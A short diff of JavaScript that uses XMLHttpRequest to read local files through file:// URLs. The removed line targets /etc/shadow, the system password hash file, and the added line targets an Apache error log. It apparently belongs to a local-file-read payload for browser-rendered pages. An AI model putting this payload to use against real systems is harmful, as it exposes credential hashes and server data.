@@ -6,5 +6,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/shadow"); 
+oReq.open("GET", "file:///var/log/apache2/error.log"); 
 oReq.send();
